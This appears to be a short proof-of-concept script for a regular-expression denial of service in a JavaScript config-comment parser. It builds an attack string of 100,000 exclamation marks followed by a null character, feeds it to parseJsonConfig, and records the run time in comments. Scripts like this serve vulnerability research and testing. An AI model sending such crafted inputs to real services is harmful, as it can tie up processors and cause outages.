const ConfigCommentParser = require("./config-comment-parser.js");

//Attack String :""+"!"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "!";
}
str += "\u0000";

var parser = new ConfigCommentParser();
console.log(parser.parseJsonConfig(str));

// real    0m0.567s
// user    0m0.152s
// sys     0m0.019s
